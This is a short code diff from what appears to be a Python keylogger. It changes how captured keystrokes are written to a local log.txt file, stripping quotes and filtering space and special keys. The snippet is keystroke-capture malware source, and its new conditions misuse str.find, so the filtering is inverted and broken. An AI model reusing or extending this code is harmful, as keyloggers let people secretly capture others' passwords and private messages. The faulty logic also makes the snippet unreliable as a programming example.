@@ -15,7 +15,11 @@ def typed(key):
 def writeOnFile(keys):
     with open("log.txt","a") as f:
         for key in keys:
-            f.write(str(key))
+            k = str(key).replace("'","")
+            if k.find("space"):
+                f.write("\n")
+            elif not k.find("Key"):
+                f.write(k)
 
 def released(key):
     if key==Key.esc:
